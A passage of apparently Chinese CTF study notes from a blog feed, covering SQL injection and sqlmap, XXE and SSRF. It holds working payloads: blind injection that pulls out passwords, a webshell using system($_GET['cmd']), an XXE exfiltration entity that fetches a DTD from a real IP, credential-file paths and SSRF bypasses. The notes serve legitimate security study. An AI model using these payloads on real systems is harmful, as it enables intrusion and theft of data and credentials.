<td><code>id=1 AND LENGTH(database())=8</code></td>
<td>确认数据库名或数据长度</td>
</tr>
<tr>
<td>猜测数据条数</td>
<td><code>id=1 AND (SELECT COUNT(*) FROM users)=5</code></td>
<td>确认表中记录数量</td>
</tr>
</tbody>
</table>
<h5 id="1判断方法"><a class="markdownIt-Anchor" href="#1判断方法"></a> 1.判断方法:</h5>
<table>
<thead>
<tr>
<th>步骤</th>
<th>攻击描述</th>
<th>攻击示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>探测注入点，初步判断条件</td>
<td><code>id=1 AND 1=1</code>(True), <code>id=1 AND 1=2</code>(False)</td>
</tr>
<tr>
<td>2</td>
<td>判断数据库长度</td>
<td><code>id=1 AND LENGTH(database())=8</code></td>
</tr>
<tr>
<td>3</td>
<td>枚举数据库名</td>
<td><code>id=1 AND substr(database(),1,1)='c'</code></td>
</tr>
<tr>
<td>4</td>
<td>枚举数据表</td>
<td><code>id=1 AND substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'</code></td>
</tr>
<tr>
<td>5</td>
<td>枚举字段、记录数据</td>
<td><code>id=1 AND substr((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1)='p'</code></td>
</tr>
<tr>
<td>6</td>
<td>逐字符猜测敏感数据（如用户密码）</td>
<td><code>id=1 AND substr((SELECT password FROM users LIMIT 0,1),1,1)='a'</code></td>
</tr>
</tbody>
</table>
<h4 id="3堆叠注入"><a class="markdownIt-Anchor" href="#3堆叠注入"></a> 3.堆叠注入:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">在一条 <span class="keyword">SQL</span> 语句后加 ; 再写另一条语句，一次执行多条 <span class="keyword">SQL</span></span><br></pre></td></tr></table></figure>
<h5 id="1row0"><a class="markdownIt-Anchor" href="#1row0"></a> 1.row(0):</h5>
<h6 id="row0-的真实含义"><a class="markdownIt-Anchor" href="#row0-的真实含义"></a> <code>$row[0]</code> 的真实含义：</h6>
<ul>
<li><code>$pdo-&gt;query(...)-&gt;fetch()</code> 默认返回一个数组</li>
<li>索引方式 <code>$row[0]</code> 表示 <strong>查询结果的第一列值</strong></li>
</ul>
<h4 id="4mysql下limit注入方法order-by之后"><a class="markdownIt-Anchor" href="#4mysql下limit注入方法order-by之后"></a> 4.Mysql下Limit注入方法(ORDER BY之后)</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">如果前面，没有<span class="keyword">order</span> <span class="keyword">by</span> 直接通过 <span class="keyword">union</span> 注入</span><br><span class="line">在LIMIT后面可以跟两个函数，<span class="keyword">PROCEDURE</span> 和 <span class="keyword">INTO</span>，<span class="keyword">INTO</span>除非有写入shell的权限，否则是无法利用的</span><br></pre></td></tr></table></figure>
<h5 id="1基于报错注入的limit"><a class="markdownIt-Anchor" href="#1基于报错注入的limit"></a> 1.基于报错注入的limit:</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>); </span><br></pre></td></tr></table></figure>
<h5 id="2基于时间注入"><a class="markdownIt-Anchor" href="#2基于时间注入"></a> 2.基于时间注入;</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(IF(MID(version(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, BENCHMARK(<span class="number">5000000</span>,SHA1(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h2 id="常见查询用法"><a class="markdownIt-Anchor" href="#常见查询用法"></a> 常见查询用法</h2>
<h3 id="1查询某张表中名为pass的字段"><a class="markdownIt-Anchor" href="#1查询某张表中名为pass的字段"></a> 1.查询某张表中名为pass的字段</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(pass) <span class="keyword">FROM</span> users;</span><br><span class="line">          这是要查询某张表中名为 pass 的字段有多少条记录</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>场景</th>
<th>是否需要 ```</th>
<th>理由</th>
</tr>
</thead>
<tbody>
<tr>
<td>字段名是保留字（如 <code>user</code>, <code>pass</code>, <code>count</code>）</td>
<td>✅ 必须</td>
<td></td>
</tr>
<tr>
<td>保证大小写敏感一致</td>
<td>✅ 推荐</td>
<td></td>
</tr>
<tr>
<td>表名/字段名中有特殊字符或空格</td>
<td>✅ 必须</td>
<td></td>
</tr>
<tr>
<td>想绕过 WAF 过滤字段关键字</td>
<td>✅ 建议使用</td>
<td></td>
</tr>
<tr>
<td>普通字段名、表名</td>
<td>❌ 可选，不强制</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="2通配符"><a class="markdownIt-Anchor" href="#2通配符"></a> 2.通配符:</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">like</span> flag&#123;<span class="operator">%</span>   </span><br><span class="line">        <span class="comment">--#是通配符</span></span><br></pre></td></tr></table></figure>
<h3 id="3查询文件内容函数"><a class="markdownIt-Anchor" href="#3查询文件内容函数"></a> 3.查询文件内容函数:</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">load_file()     <span class="comment">---查询函数</span></span><br><span class="line">substr()   <span class="comment">--提取函数   --等价于 substring()</span></span><br></pre></td></tr></table></figure>
<h4 id="load_file查询函数"><a class="markdownIt-Anchor" href="#load_file查询函数"></a> load_file()查询函数:</h4>
<table>
<thead>
<tr>
<th>项目</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>函数名称</strong></td>
<td><code>load_file(path)</code></td>
</tr>
<tr>
<td><strong>用途</strong></td>
<td>从 <strong>MySQL 服务器的文件系统</strong> 中读取指定路径的文件内容</td>
</tr>
<tr>
<td><strong>常见用途</strong></td>
<td>文件读取漏洞利用（如读取 <code>/etc/passwd</code>、Web 目录源码等）</td>
</tr>
<tr>
<td><strong>返回类型</strong></td>
<td><code>LONGTEXT</code>（即文本内容）</td>
</tr>
<tr>
<td><strong>典型用法</strong></td>
<td><code>SELECT load_file('/etc/passwd');</code></td>
</tr>
<tr>
<td><strong>前提条件</strong></td>
<td>MySQL 具有 <code>FILE</code> 权限路径文件存在MySQL 用户对该文件有<strong>读权限</strong>系统未限制 secure_file_priv</td>
</tr>
</tbody>
</table>
<h4 id="substr提取函数"><a class="markdownIt-Anchor" href="#substr提取函数"></a> substr()提取函数:</h4>
<table>
<thead>
<tr>
<th>项目</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>函数名称</strong></td>
<td><code>substr(str, pos, len)</code></td>
</tr>
<tr>
<td><strong>用途</strong></td>
<td>从字符串 <code>str</code> 中提取从 <code>pos</code> 位置开始，长度为 <code>len</code> 的子串</td>
</tr>
<tr>
<td><strong>等价函数</strong></td>
<td>MySQL 中还有个等价函数叫 <code>substring()</code></td>
</tr>
<tr>
<td><strong>返回值</strong></td>
<td>字符串的子串</td>
</tr>
<tr>
<td><strong>典型用法</strong></td>
<td><code>SELECT substr('flag&#123;12345&#125;', 6, 1);</code>  → 返回 <code>'1'</code></td>
</tr>
</tbody>
</table>
<h3 id="4三元表达式"><a class="markdownIt-Anchor" href="#4三元表达式"></a> 4.三元表达式;</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">IF(expr, val_if_true, val_if_false)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>部分</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>expr</code></td>
<td>条件判断表达式（可以是布尔、比较等）</td>
</tr>
<tr>
<td><code>val_if_true</code></td>
<td>如果条件为 <code>true</code>，返回这个值（这里是 <code>1</code>）</td>
</tr>
<tr>
<td><code>val_if_false</code></td>
<td>否则返回这个值（这里是 <code>0</code>）</td>
</tr>
</tbody>
</table>
<h3 id="5查询当前数据库有几张表字段"><a class="markdownIt-Anchor" href="#5查询当前数据库有几张表字段"></a> 5.查询当前数据库有几张表(字段):</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查询有几张表:</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database()</span><br><span class="line"> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database()) <span class="operator">=</span> <span class="number">2</span></span><br><span class="line"> 查询第一张表名:</span><br><span class="line"> <span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database() limit <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">   substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database() limit <span class="number">0</span>, <span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> #</span><br><span class="line"> 查询字段个数:</span><br><span class="line"> <span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database() <span class="keyword">and</span> table_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> </span><br><span class="line"> 查询一个表的字段：</span><br><span class="line"> <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database() <span class="keyword">and</span> table_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"> 爆数据:</span><br><span class="line"> ascii(substr((<span class="keyword">SELECT</span> 列名 <span class="keyword">FROM</span> 表名), N, <span class="number">1</span>))<span class="operator">=</span>X</span><br></pre></td></tr></table></figure>
<h3 id="6分页limit的用法"><a class="markdownIt-Anchor" href="#6分页limit的用法"></a> 6.分页limit的用法:</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT 是 分页利器，可用于 控制结果数量、定位目标记录、绕过限制爆破。</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>格式</th>
<th>功能说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>LIMIT N</code></td>
<td>从第一条开始，取 N 条</td>
</tr>
<tr>
<td><code>LIMIT M,N</code></td>
<td>从第 M+1 条开始，取 N 条</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>场景类别</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>指定条数</td>
<td><code>SELECT * FROM users LIMIT 1;</code></td>
<td>只取一条，适合注入测试</td>
</tr>
<tr>
<td>分页</td>
<td><code>LIMIT 0,10</code>, <code>LIMIT 10,10</code></td>
<td>分页抓取用</td>
</tr>
<tr>
<td>指定偏移</td>
<td><code>LIMIT 999999999,1</code></td>
<td>盲注中常用做出界探测</td>
</tr>
<tr>
<td>布尔盲注爆破</td>
<td><code>AND (SELECT ascii(substr(pass,1,1)) FROM users LIMIT 0,1)=97</code></td>
<td>爆破第一个用户密码第一位</td>
</tr>
<tr>
<td>列表爆破</td>
<td><code>LIMIT 0,1</code>, <code>LIMIT 1,1</code>, …</td>
<td>爆破多行数据用循环 LIMIT 爆破</td>
</tr>
</tbody>
</table>
<h2 id="sqlmap的使用"><a class="markdownIt-Anchor" href="#sqlmap的使用"></a> sqlmap的使用:</h2>
<h3 id="1tamper的写法"><a class="markdownIt-Anchor" href="#1tamper的写法"></a> 1.tamper的写法:</h3>
<h4 id="1基本结构"><a class="markdownIt-Anchor" href="#1基本结构"></a> 1.基本结构:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="operator">!</span><span class="operator">/</span>usr<span class="operator">/</span>bin<span class="operator">/</span>env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span><br><span class="line">See the file &#x27;doc/COPYING&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums import PRIORITY</span><br><span class="line">__priority__ <span class="operator">=</span> PRIORITY.LOW # 当前脚本调用优先等级</span><br><span class="line"></span><br><span class="line">def dependencies(): # 声明当前脚本适用<span class="operator">/</span>不适用的范围，可以为空。 <span class="comment">---作为提示写出</span></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, <span class="operator">*</span><span class="operator">*</span>kwargs): # 用于篡改Payload、以及请求头的主要函数</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="2priority优先级"><a class="markdownIt-Anchor" href="#2priority优先级"></a> 2.PRIORITY优先级:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">PRIORITY是定义tamper的优先级，PRIORITY有以下几个参数:</span><br><span class="line"></span><br><span class="line">LOWEST <span class="operator">=</span> <span class="number">-100</span></span><br><span class="line">LOWER <span class="operator">=</span> <span class="number">-50</span></span><br><span class="line">LOW <span class="operator">=</span> <span class="number">-10</span></span><br><span class="line">NORMAL <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">HIGH <span class="operator">=</span> <span class="number">10</span></span><br><span class="line">HIGHER <span class="operator">=</span> <span class="number">50</span></span><br><span class="line">HIGHEST <span class="operator">=</span> <span class="number">100</span></span><br><span class="line">如果使用者使用了多个tamper，sqlmap就会根据每个tamper定义PRIORITY的参数等级来优先使用等级较高的tamper，如果你有两个tamper需要同时用，需要注意这个问题。</span><br></pre></td></tr></table></figure>
<h4 id="3基于payload的绕过"><a class="markdownIt-Anchor" href="#3基于payload的绕过"></a> 3.基于payload的绕过:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">def tamper(payload, <span class="operator">*</span><span class="operator">*</span>kwargs):</span><br><span class="line">    payload <span class="operator">=</span> payload.<span class="built_in">lower</span>()</span><br><span class="line">    payload <span class="operator">=</span> payload.replace(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;seleselectct&#x27;</span>)</span><br><span class="line">    payload <span class="operator">=</span> payload.replace(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;ununionion&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    <span class="comment">--仅修改payload</span></span><br></pre></td></tr></table></figure>
<h4 id="4kwargs参数修改请求头数据"><a class="markdownIt-Anchor" href="#4kwargs参数修改请求头数据"></a> 4.kwargs参数(修改请求头数据):</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">这个参数可以修改请求头数据中的其他参数，前面的payload参数操作只体现在 url 上</span><br><span class="line">通过 kwargs 对请求头中的参数进行修改，要先理解 kwargs 是一个字典，可能要学习一下 python 里的字典知识</span><br><span class="line">kwargs 字典结构为：</span><br><span class="line">&#123;<span class="string">&#x27;headers&#x27;</span>: &#123;&#125;, <span class="string">&#x27;delimiter&#x27;</span>: <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;hints&#x27;</span>: &#123;&#125;&#125;</span><br><span class="line"></span><br><span class="line">修改请求头中 <span class="keyword">User</span><span class="operator">-</span>Agent 参数值：</span><br><span class="line">headers <span class="operator">=</span> kwargs.get(&quot;header&quot;,&#123;&#125;)</span><br><span class="line">headers[<span class="string">&#x27;User-Agent&#x27;</span>]<span class="operator">=</span>&quot;你要改的值&quot;</span><br></pre></td></tr></table></figure>
<h3 id="2一些常用参数"><a class="markdownIt-Anchor" href="#2一些常用参数"></a> 2.一些常用参数:</h3>
<h4 id="1优化加快速度"><a class="markdownIt-Anchor" href="#1优化加快速度"></a> 1.优化，加快速度:</h4>
<h5 id="1-keep-alive"><a class="markdownIt-Anchor" href="#1-keep-alive"></a> 1.-keep-alive:</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">保持长连接，加快速度</span><br></pre></td></tr></table></figure>
<h5 id="2threads"><a class="markdownIt-Anchor" href="#2threads"></a> 2.–threads</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">多线程，加速</span><br></pre></td></tr></table></figure>
<h4 id="不使用缓存flush-session"><a class="markdownIt-Anchor" href="#不使用缓存flush-session"></a> 不使用缓存（–flush-session）:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--flush-session    不让sqlmap使用缓存内容</span></span><br></pre></td></tr></table></figure>
<h4 id="一键getshell"><a class="markdownIt-Anchor" href="#一键getshell"></a> 一键getshell:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--os-shell    </span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>阶段</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>① 识别注入点</td>
<td>通过注入参数（如 <code>id=1</code>），确定注入类型（Boolean-Based / Union / Error-Based 等）</td>
</tr>
<tr>
<td>② 探测数据库类型</td>
<td>MySQL、PostgreSQL、MSSQL、Oracle，不同类型决定后续利用方法</td>
</tr>
<tr>
<td>③ 尝试文件写入</td>
<td>用 SQL 语句写 PHP 文件到 web 目录（如 <code>/var/www/html/</code>）</td>
</tr>
<tr>
<td>④ 上传 WebShell</td>
<td>写入包含 <code>system($_GET['cmd'])</code> 的 PHP 文件</td>
</tr>
<tr>
<td>⑤ 验证 WebShell 是否成功</td>
<td>用 HTTP 请求访问 <code>webshell.php?cmd=whoami</code> 来判断是否能执行命令</td>
</tr>
<tr>
<td>⑥ 启动命令控制交互</td>
<td>自动用 URL + <code>cmd=</code> 参数反复提交命令，实现 shell 操作（但不是交互式真实 shell，是伪 shell）</td>
</tr>
</tbody>
</table>
<h4 id="sqlmap-注入技术参数technique"><a class="markdownIt-Anchor" href="#sqlmap-注入技术参数technique"></a> Sqlmap 注入技术参数(–technique):</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--technique    </span></span><br><span class="line">B：<span class="type">Boolean</span><span class="operator">-</span>based blind（布尔型注入）</span><br><span class="line">E：Error<span class="operator">-</span>based（报错型注入）</span><br><span class="line">U：<span class="keyword">Union</span> query<span class="operator">-</span>based（可联合查询注入）</span><br><span class="line">S：Stacked queries（可多语句查询注入）</span><br><span class="line">T：<span class="type">Time</span><span class="operator">-</span>based blind（基于时间延迟注入）</span><br><span class="line">Q：Inline queries（嵌套查询注入）</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>xxe</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/xxe/</url>
    <content><![CDATA[<h1 id="xxe的原理"><a class="markdownIt-Anchor" href="#xxe的原理"></a> xxe的原理:</h1>
<p>可以通过构造恶意 XML 数据，引入外部实体来实现：</p>
<ul>
<li>读取本地敏感文件（如 <code>/etc/passwd</code>）</li>
<li>进行内网 SSRF</li>
<li>拒绝服务（Billion Laughs）</li>
<li>执行系统命令（少见，取决于 parser）</li>
</ul>
<h2 id="1xxe的前提"><a class="markdownIt-Anchor" href="#1xxe的前提"></a> 1.xxe的前提:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(false);    --允许加载外部实体（XXE的前提）</span><br><span class="line">if(isset($xmlfile))&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">---使用DOM解析XML，开启了实体替换（LIBXML_NOENT）和DTD加载（LIBXML_DTDLOAD），这正是XXE攻击生效的关键</span><br></pre></td></tr></table></figure>
<h2 id="2常见的攻击方式"><a class="markdownIt-Anchor" href="#2常见的攻击方式"></a> 2.常见的攻击方式:</h2>
<table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>📁 本地文件读取</td>
<td>读取敏感文件</td>
<td><code>file:///etc/passwd</code></td>
</tr>
<tr>
<td>🌐 SSRF</td>
<td>访问内网资源</td>
<td><code>http://127.0.0.1/admin</code></td>
</tr>
<tr>
<td>💣 DoS</td>
<td>百万笑攻击导致内存爆炸</td>
<td><code>&lt;!ENTITY a &quot;&amp;a;&amp;a;&amp;a;&quot;&gt;</code></td>
</tr>
<tr>
<td>📤 外带</td>
<td>将数据发送到外部服务器</td>
<td><code>http://attacker.com/?d=&amp;xxe;</code></td>
</tr>
<tr>
<td>😈 Blind-XXE</td>
<td>没有直接输出，通过回显外带</td>
<td>配合 <code>&lt;!ENTITY xxe SYSTEM &quot;http://x.x.x.x:8080/?data=...&quot; &gt;</code></td>
</tr>
</tbody>
</table>
<h1 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> payload:</h1>
<h2 id="1直接"><a class="markdownIt-Anchor" href="#1直接"></a> 1.直接:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &amp;xxe;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<h2 id="2数据外带"><a class="markdownIt-Anchor" href="#2数据外带"></a> 2.数据外带:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;   ---这个位置可以换成php伪协议  </span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM &quot;http://139.224.54.229/xxe.dtd&quot;&gt;</span><br><span class="line">  %dtd;</span><br><span class="line">  %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="3一些绕过"><a class="markdownIt-Anchor" href="#3一些绕过"></a> 3.一些绕过</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">可以对数据进行UTF-<span class="number">16</span>编码绕过(使用python)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>ssrf</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/ssrf/</url>
    <content><![CDATA[<h1 id="ssrf的运用原理"><a class="markdownIt-Anchor" href="#ssrf的运用原理"></a> SSRF的运用原理:</h1>
<h2 id="1原理"><a class="markdownIt-Anchor" href="#1原理"></a> 1.原理:</h2>
<p>利用存在漏洞的服务器，向内部或外部资源发送伪造的请求，从而达到以下目的：</p>
<ul>
<li>探测内网结构（端口扫描、服务发现）</li>
<li>访问内网API（如云服务元数据接口）</li>
<li>进行身份伪造（访问携带身份信息的资源）</li>
<li>造成DoS、反弹请求等攻击</li>
</ul>
<h2 id="2常用检测方法"><a class="markdownIt-Anchor" href="#2常用检测方法"></a> 2.常用检测方法:</h2>
<table>
<thead>
<tr>
<th>检测类型</th>
<th>方法</th>
<th>描述</th>
<th>检测是否成功的方式</th>
<th>绕过思路</th>
</tr>
</thead>
<tbody>
<tr>
<td>🌐 常见</td>
<td><strong>访问内网地址</strong></td>
<td>127.0.0.1、localhost、169.254.169.254、内网IP段等</td>
<td>返回内容、响应时间差</td>
<td>使用整数、16进制、<code>[::]</code>等变体绕过</td>
</tr>
<tr>
<td>🌐 常见</td>
<td><strong>DNSlog平台检测</strong></td>
<td>传入外部 DNS 地址（如 <code>xx.ceye.io</code>）</td>
<td>DNS平台记录到解析请求</td>
<td>域名跳转、伪协议等规避安全策略</td>
</tr>
<tr>
<td>🌐 常见</td>
<td><strong>HTTP外带检测</strong></td>
<td>构造 URL 发起外部 HTTP 请求</td>
<td>服务器访问日志、Burp Collaborator、tcpdump</td>
<td>基于 SSRF 的跳转链</td>
</tr>
<tr>
<td>🌐 常见</td>
<td><strong>文件协议</strong></td>
<td>file:///etc/passwd 等</td>
<td>如果读取内容返回，证明存在 SSRF</td>
<td>file协议黑名单绕过、伪协议组合</td>
</tr>
<tr>
<td>🌐 常见</td>
<td><strong>gopher协议检测</strong></td>
<td>构造 Redis 注入 / SSRF-RCE</td>
<td>返回内容为空，但配合后端验证成功</td>
<td>被多数防火墙限制，注意协议混淆</td>
</tr>
<tr>
<td>🌐 常见</td>
<td><strong>请求延迟检测</strong></td>
<td>访问 <code>http://10.0.0.1:81</code> 等，观察延迟</td>
<td>请求阻塞 / 超时 / 响应慢</td>
<td>用于端口扫描时做判断</td>
</tr>
<tr>
<td>⚠️ 不常见</td>
<td><strong>请求头注入检测</strong></td>
<td>伪造 <code>Host</code>, <code>X-Forwarded-Host</code>, <code>X-Real-IP</code> 等</td>
<td>后端错误信息中暴露 Host 信息</td>
<td>配合 Host header 漏洞打 SSRF</td>
</tr>
<tr>
<td>⚠️ 不常见</td>
<td><strong>Open Redirect 联动检测</strong></td>
<td>先跳转再 SSRF</td>
<td>可被 SSRF 利用的 OpenRedirect</td>
<td>常规过滤难以识别 URL 跳转链</td>
</tr>
<tr>
<td>⚠️ 不常见</td>
<td><strong>SVG 渲染触发 HTTP 请求</strong></td>
<td>提交嵌入外链的 SVG，观察目标服务器是否发起请求</td>
<td>需要精心构造图像并外带链接</td>
<td>绕过非URL型白名单</td>
</tr>
<tr>
<td>⚠️ 不常见</td>
<td><strong>PDF生成功能 SSRF</strong></td>
<td>提交带图像URL的 HTML，让服务器渲染 PDF 触发请求</td>
<td>外部服务器或DNS记录</td>
<td>PDF服务通常可执行外部请求</td>
</tr>
<tr>
<td>⚠️ 不常见</td>
<td><strong>OAuth/SSO 重定向利用</strong></td>
<td>借助SSO第三方回调URL发起 SSRF</td>
<td>需要结合OAuth实现细节</td>
<td>重定向 + SSRF合击链</td>
</tr>
<tr>
<td>⚠️ 不常见</td>
<td><strong>SMTP SSRF</strong></td>
<td><code>smtp://127.0.0.1:25</code> 向邮件服务注入请求</td>
<td>邮件被发送、行为侧信道</td>
<td>多协议SSRF + 内网钓鱼链</td>
</tr>
</tbody>
</table>
<h2 id="3linxu常见敏感目录"><a class="markdownIt-Anchor" href="#3linxu常见敏感目录"></a> 3.linxu常见敏感目录:</h2>
<table>
<thead>
<tr>
<th>路径</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/etc/passwd</code></td>
<td>用户信息（无密码）</td>
</tr>
<tr>
<td><code>/etc/shadow</code></td>
<td>加密密码（需root权限）</td>
</tr>
<tr>
<td><code>/root/.ssh/id_rsa</code></td>
<td>SSH私钥</td>
</tr>
<tr>
<td><code>/var/www/html/config.php</code></td>
<td>Web站点配置</td>
</tr>
<tr>
<td><code>/proc/self/environ</code></td>
<td>当前进程环境变量（可能泄漏Token）</td>
</tr>
<tr>
<td><code>/proc/version</code></td>
<td>内核版本信息</td>
</tr>
</tbody>
</table>
<h2 id="4对127001的绕过"><a class="markdownIt-Anchor" href="#4对127001的绕过"></a> 4.对127.0.0.1的绕过:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">可以把域名的解析改到<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">    就能成功解析</span><br></pre></td></tr></table></figure>
<h2 id="5通过302重定向的方法跳转"><a class="markdownIt-Anchor" href="#5通过302重定向的方法跳转"></a> 5.通过302重定向的方法跳转:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="6通过标准的url结构绕过"><a class="markdownIt-Anchor" href="#6通过标准的url结构绕过"></a> 6.通过标准的url结构绕过:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scheme://username:password@host:port/path?query#fragment</span><br></pre></td></tr></table></figure>
<h1 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数:</h1>
<h2 id="1curl_exec函数"><a class="markdownIt-Anchor" href="#1curl_exec函数"></a> 1.curl_exec函数:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl_exec:把参数当作curl的参数传递</span><br></pre></td></tr></table></figure>
<h1 id="getshellgopherus"><a class="markdownIt-Anchor" href="#getshellgopherus"></a> GetShell(Gopherus):</h1>
<h2 id="1打mysql无密码"><a class="markdownIt-Anchor" href="#1打mysql无密码"></a> 1.打mysql(无密码):</h2>
<ul>
<li>
<p>MySQL：如果用户没有密码保护，您可以转储他的数据库，也可以将恶意文件放入他的系统中。</p>
